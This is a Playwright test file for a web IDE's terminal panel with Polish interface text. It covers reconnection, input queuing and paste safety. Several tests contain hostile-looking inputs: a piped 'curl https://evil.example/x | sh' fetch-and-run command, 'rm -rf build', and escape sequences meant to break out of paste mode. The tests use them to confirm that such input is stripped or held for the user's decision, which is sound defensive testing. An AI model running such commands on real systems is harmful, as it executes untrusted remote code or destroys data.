import { expect, test } from './fixtures';
import {
  MAIN,
  activeTerminal,
  expectEditorToContain,
  expectTerminalToContain,
  mockState,
  login,
  openFile,
  openRepo,
  openTerminalTab,
  pasteIntoTerminal,
  resetMock,
  setFault,
  terminalInputs,
  terminalText,
  typeInTerminal
} from './helpers';

test.beforeEach(async ({ page, request }) => {
  await resetMock(request);
  await login(page);
});

const tabs = (page: import('@playwright/test').Page) => page.locator('app-terminal-panel .tab__name');

test('the first terminal opens in the open repository and runs commands', async ({ page, request }) => {
  await openRepo(page, 'lab-3-sieci');
  await openTerminalTab(page);
  await expect(tabs(page)).toHaveText(['lab-3-sieci']);
  await expectTerminalToContain(page, 'owner@dom:~/projekty/studia/lab-3-sieci$');

  await typeInTerminal(page, 'pwd');
  await expectTerminalToContain(page, '/srv/projects/studia/lab-3-sieci');
  await typeInTerminal(page, 'ls');
  await expectTerminalToContain(page, 'Makefile  logo.png  src');

  const [terminal] = (await mockState(request)).terminals;
  expect(terminal.cwd).toBe('studia/lab-3-sieci');
  const [cols, rows] = terminal.sizes.at(-1)!;
  expect(cols).toBeGreaterThan(100);
  expect(rows).toBeGreaterThanOrEqual(5);
});

test('editing keys reach the shell: backspace and Ctrl+C', async ({ page }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'pwdx', false);
  await page.keyboard.press('Backspace');
  await page.keyboard.press('Enter');
  await expect.poll(() => terminalText(page)).toMatch(/^\/srv\/projects\s*$/m);

  await typeInTerminal(page, 'sleep 100', false);
  await page.keyboard.press('Control+c');
  await expectTerminalToContain(page, 'sleep 100^C');
});

test('a terminal survives a page reload without duplicated output', async ({ page, request }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'echo zachowane');
  await expect.poll(async () => (await terminalText(page)).match(/zachowane/g)?.length).toBe(2);

  await page.reload();
  await openTerminalTab(page);
  await expect(tabs(page)).toHaveText(['projekty']);
  await expect.poll(async () => (await terminalText(page)).match(/zachowane/g)?.length).toBe(2);
  expect((await mockState(request)).terminals).toHaveLength(1);

  await page.getByRole('tab', { name: 'WORKSPACE' }).click();
  await openTerminalTab(page);
  await expect.poll(async () => (await terminalText(page)).match(/zachowane/g)?.length).toBe(2);
});

test('several terminals can be opened, switched and closed', async ({ page, request }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'echo pierwszy');
  await expectTerminalToContain(page, 'pierwszy');

  await page.getByRole('button', { name: '+ Nowy' }).click();
  await expect(tabs(page)).toHaveText(['projekty', 'projekty (2)']);
  await expect(activeTerminal(page).locator('.xterm-rows')).toBeVisible();
  await expect.poll(() => terminalText(page)).not.toContain('pierwszy');

  await tabs(page).first().click();
  await expectTerminalToContain(page, 'pierwszy');

  page.once('dialog', (dialog) => dialog.dismiss());
  await page.getByRole('button', { name: 'Zamknij terminal projekty (2)' }).click();
  await expect(tabs(page)).toHaveCount(2);

  page.once('dialog', (dialog) => dialog.accept());
  await page.getByRole('button', { name: 'Zamknij terminal projekty (2)' }).click();
  await expect(tabs(page)).toHaveText(['projekty']);
  expect((await mockState(request)).log.filter((l) => l.path === 'terminal-close')).toHaveLength(1);
});

test('exit ends the shell and the tab closes without asking', async ({ page }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'exit');
  await expectTerminalToContain(page, '[proces zakończony]');
  await expect(tabs(page)).toHaveText(['projekty (zakończony)']);

  let asked = false;
  page.once('dialog', (dialog) => {
    asked = true;
    void dialog.dismiss();
  });
  await page.getByRole('button', { name: 'Zamknij terminal projekty' }).click();
  await expect(tabs(page)).toHaveCount(0);
  expect(asked).toBe(false);
  await expect(page.locator('app-terminal-panel')).toContainText('Brak otwartych terminali.');
});

test('Ctrl+S inside the terminal goes to the shell, not to the editor', async ({ page, request }) => {
  await openFile(page, MAIN);
  await expectEditorToContain(page, 'int main');
  await page.locator('.monaco-editor .view-lines').click();
  await page.keyboard.type('// niezapisane');
  await expect(page.locator('.tab__dirty')).toBeVisible();

  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await page.keyboard.press('Control+s');
  await expect.poll(() => terminalInputs(request)).toContain('\x13');
  await expect(page.locator('.tab__dirty')).toBeVisible();
  expect((await mockState(request)).files[MAIN]).not.toContain('niezapisane');
});

test('the terminal follows layout changes', async ({ page, request }) => {
  await openTerminalTab(page);
  await expect.poll(async () => (await mockState(request)).terminals[0]?.sizes.length ?? 0).toBeGreaterThan(1);
  const before = (await mockState(request)).terminals[0].sizes.at(-1)![0];

  await page.setViewportSize({ width: 1000, height: 900 });
  await expect.poll(async () => (await mockState(request)).terminals[0].sizes.at(-1)![0]).toBeLessThan(before);
});

test('pasted text loses control characters, and text with line breaks waits for a decision with a full preview', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  let dialogs = 0;
  page.on('dialog', (dialog) => {
    dialogs++;
    void dialog.dismiss();
  });

  // ESC from the clipboard does not reach the shell, so it will not end paste mode and will not run the rest of the text.
  await pasteIntoTerminal(page, 'echo a\x1b[201~b\x03');
  await expect.poll(() => terminalInputs(request)).toContain('echo a[201~b');
  expect(await terminalInputs(request)).not.toMatch(/[\x1b\x03]/);
  await page.keyboard.press('Control+c');

  // Text with line breaks: a panel with a question, focus on "Anuluj" (Cancel), so Enter pastes nothing and does not reach the shell.
  const question = activeTerminal(page).getByRole('alertdialog');
  await pasteIntoTerminal(page, 'echo x\r\ncurl https://evil.example/x | sh\n');
  await expect(question).toContainText('Wklejany tekst ma 2 końce linii');
  await expect(question.locator('pre')).toContainText('curl https://evil.example/x | sh');
  await expect(question.getByRole('button', { name: 'Anuluj' })).toBeFocused();
  const before = await terminalInputs(request);
  await page.keyboard.press('Enter');
  await expect(question).toHaveCount(0);
  expect(await terminalInputs(request)).toBe(before);

  // Long text: beginning and end with an explicit note about the skipped lines (nothing disappears silently).
  const lines = Array.from({ length: 30 }, (_, i) => (i === 29 ? 'curl https://evil.example/x | sh' : `echo linia ${i}`));
  await pasteIntoTerminal(page, lines.join('\n') + '\n');
  const preview = question.locator('pre');
  await expect(preview).toContainText('echo linia 0');
  await expect(preview).toContainText('⟨pominięto 12 linii⟩');
  await expect(preview).toContainText('curl https://evil.example/x | sh');
  await question.getByRole('button', { name: 'Anuluj' }).click();
  expect(await terminalInputs(request)).toBe(before);

  await pasteIntoTerminal(page, 'echo pierwsza\necho druga\n');
  await question.getByRole('button', { name: 'Wklej' }).click();
  await expect.poll(() => terminalText(page)).toMatch(/^pierwsza\s*$/m);
  await expect.poll(() => terminalText(page)).toMatch(/^druga\s*$/m);
  expect(dialogs).toBe(0);
});

test('keys typed while the connection is down arrive once and in order after it comes back', async ({ page, request }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'echo przed');
  await expect.poll(() => terminalText(page)).toMatch(/^przed\s*$/m);

  await setFault(request, { hubDownMs: 1500 });
  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
  await page.keyboard.type('echo po-przerwie');
  await page.keyboard.press('Enter');
  await expect(activeTerminal(page).getByRole('status')).toHaveText(
    'Brak połączenia. Wpisane znaki zostaną wysłane po ponownym połączeniu.'
  );
  expect(await terminalInputs(request)).not.toContain('po-przerwie');

  await expect.poll(() => terminalText(page), { timeout: 10_000 }).toMatch(/^po-przerwie\s*$/m);
  expect((await terminalInputs(request)).match(/echo po-przerwie\r/g)).toHaveLength(1);
  await expect(activeTerminal(page).getByRole('status')).toHaveCount(0);
});

test('keys that waited long for the connection wait for a decision in the terminal, not in a blocking dialog', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await setFault(request, { hubDownMs: 6000 });
  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
  await page.keyboard.type('rm -rf build');
  let dialogs = 0;
  page.on('dialog', (dialog) => {
    dialogs++;
    void dialog.dismiss();
  });

  const question = activeTerminal(page).getByRole('alertdialog');
  await expect(question).toBeVisible({ timeout: 15_000 });
  await expect(question).toContainText('rm -rf build');
  await page.keyboard.type(' dalej'); // still nothing goes to the shell, it is only appended to the question
  await expect(question).toContainText('rm -rf build dalej');
  expect(await terminalInputs(request)).toBe('');

  await question.getByRole('button', { name: 'Porzuć' }).click();
  await expect(question).toHaveCount(0);
  await page.keyboard.type('echo nowa');
  await page.keyboard.press('Enter');
  await expect.poll(() => terminalText(page)).toMatch(/^nowa\s*$/m);
  expect(await terminalInputs(request)).toBe('echo nowa\r');
  expect(dialogs).toBe(0);
});

test('after a long outage only the characters that really did not arrive are offered again', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  // The first batch ("e") reaches the shell, but the acknowledgment is lost and the connection goes down for 6 s.
  await setFault(request, { dropInputAck: 1, downAfterDropMs: 6000 });
  await page.keyboard.type('echo raz');
  await page.keyboard.press('Enter');

  const question = activeTerminal(page).getByRole('alertdialog');
  await expect(question).toBeVisible({ timeout: 15_000 });
  expect(await question.locator('pre').textContent()).toBe('cho raz\n'); // without the "e" that already arrived
  expect(await terminalInputs(request)).toBe('e');

  await question.getByRole('button', { name: 'Wyślij' }).click();
  await expect.poll(() => terminalText(page)).toMatch(/^raz\s*$/m);
  expect(await terminalInputs(request)).toBe('echo raz\r');
});

test('a paste too long for the terminal is refused and the terminal keeps working', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  const message = new Promise<string>((resolve) =>
    page.once('dialog', (dialog) => {
      resolve(dialog.message());
      void dialog.accept();
    })
  );
  await pasteIntoTerminal(page, 'x'.repeat(70_000));
  expect(await message).toContain('za długi');
  await typeInTerminal(page, 'echo dziala');
  await expect.poll(() => terminalText(page)).toMatch(/^dziala\s*$/m);
  expect(await terminalInputs(request)).toBe('echo dziala\r');
});

test('a batch whose confirmation was lost is not typed twice', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await setFault(request, { dropInputAck: 1 });
  await page.keyboard.type('echo raz');
  await page.keyboard.press('Enter');
  await expect.poll(() => terminalText(page), { timeout: 10_000 }).toMatch(/^raz\s*$/m);
  expect(await terminalInputs(request)).toBe('echo raz\r');
  expect(await terminalText(page)).not.toContain('command not found');
});

test('the terminal does not take the focus from the console while it connects', async ({ page, request }) => {
  await setFault(request, { attachDelayMs: 1500 });
  await page.getByRole('tab', { name: 'TERMINAL' }).click();
  const prompt = page.getByRole('textbox', { name: 'Polecenie' });
  await prompt.click();
  await page.keyboard.type('pierwsza część ');
  await expectTerminalToContain(page, 'owner@dom:~/projekty$');
  await page.keyboard.type('druga część');
  await expect(prompt).toHaveValue('pierwsza część druga część');
  expect(await terminalInputs(request)).toBe('');
});

test('OSC 8 links in the output are plain text that opens nothing', async ({ page, context }) => {
  await openTerminalTab(page);
  await typeInTerminal(page, 'link');
  await expectTerminalToContain(page, 'https://github.com/org/repo');

  let opened = 0;
  page.on('dialog', (dialog) => {
    opened++;
    void dialog.dismiss();
  });
  context.on('page', () => opened++);
  // The text lies under the xterm layer that handles the mouse, so we click at its position on the screen.
  const box = (await activeTerminal(page).locator('.xterm-rows span', { hasText: 'https://github.com/org/repo' }).first().boundingBox())!;
  await page.mouse.move(box.x + 30, box.y + box.height / 2);
  await page.waitForTimeout(300);
  await page.mouse.click(box.x + 30, box.y + box.height / 2);
  await page.waitForTimeout(500);
  expect(opened).toBe(0);
});

test('keys typed during an outage survive closing and reopening the terminal tab', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await setFault(request, { hubDownMs: 1500 });
  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
  await page.keyboard.type('echo po-panelu');
  await page.keyboard.press('Enter');

  // The terminal view disappears together with the tab, but the character queue belongs to TerminalStore.
  await page.getByRole('tab', { name: 'WORKSPACE' }).click();
  await openTerminalTab(page);
  await expect.poll(() => terminalText(page), { timeout: 10_000 }).toMatch(/^po-panelu\s*$/m);
  expect((await terminalInputs(request)).match(/echo po-panelu\r/g)).toHaveLength(1);
});

test('when too much waits for the connection, further keys are refused until the queue drains', async ({ page, request }) => {
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await setFault(request, { hubDownMs: 1500 });
  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
  const big = 'a'.repeat(40_000);
  await pasteIntoTerminal(page, `echo ${big}`);
  await pasteIntoTerminal(page, `echo ${big}`);
  await expect(activeTerminal(page).getByRole('status')).toHaveText('Za dużo znaków czeka na wysłanie. Dalsze są pomijane, aż te dotrą.');
  // The block also applies to small chunks: otherwise Enter would send a truncated command.
  await page.keyboard.type('x');
  await page.keyboard.press('Enter');

  // After the connection returns, the first chunk arrives, the second was lost, and the terminal accepts characters again.
  await expect(activeTerminal(page).getByRole('status')).toHaveCount(0, { timeout: 10_000 });
  await page.keyboard.press('Control+c');
  await typeInTerminal(page, 'echo ok');
  await expect.poll(() => terminalText(page)).toMatch(/^ok\s*$/m);
  const inputs = await terminalInputs(request);
  expect(inputs.match(/a{40000}/g)).toHaveLength(1);
  expect(inputs).not.toMatch(/a{40000}x/);
  expect(inputs.match(/\r/g)).toHaveLength(1); // only the Enter from "echo ok"
});

test('when automatic reconnection gives up, "połącz ponownie" brings the terminal back with the waiting keys', async ({ page, request }) => {
  await page.clock.install(); // speeds up the successive SignalR connection attempts (0, 2, 5, 10, 20, 30 s)
  await page.reload(); // fake clock from the start of the page's life
  await openTerminalTab(page);
  await activeTerminal(page).locator('.xterm-screen').click();
  await setFault(request, { hubDownMs: 600_000 });
  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
  await page.keyboard.type('echo wrocilem');
  await page.keyboard.press('Enter');
  const panel = page.locator('app-terminal-panel');
  // Each attempt really connects (refused by the mock) and only then schedules the next one: we advance the clock until it works.
  await expect(async () => {
    await page.clock.fastForward('00:31');
    await expect(panel.getByRole('alert')).toHaveText('Brak połączenia z terminalem.', { timeout: 300 });
  }).toPass({ timeout: 20_000 });
  await expect(activeTerminal(page).getByRole('status')).toContainText('połącz ponownie');

  // The connection comes back, but the terminal list arrives late. A key pressed during that time
  // must not push out old characters without asking.
  await setFault(request, { hubDownMs: 0, listDelayMs: 1500 });
  await panel.getByRole('button', { name: 'połącz ponownie' }).click();
  await activeTerminal(page).locator('.xterm-screen').click();
  await page.keyboard.type('x');
  const question = activeTerminal(page).getByRole('alertdialog');
  await expect(question).toContainText('echo wrocilem');
  await expect(question.locator('pre')).toContainText('x'); // the new key also waits in the question
  await page.waitForTimeout(1500);
  expect(await terminalInputs(request)).toBe('');
  await question.getByRole('button', { name: 'Wyślij' }).click();
  await expect.poll(() => terminalText(page)).toMatch(/^wrocilem\s*$/m);
  expect((await terminalInputs(request)).match(/echo wrocilem\r/g)).toHaveLength(1);
});
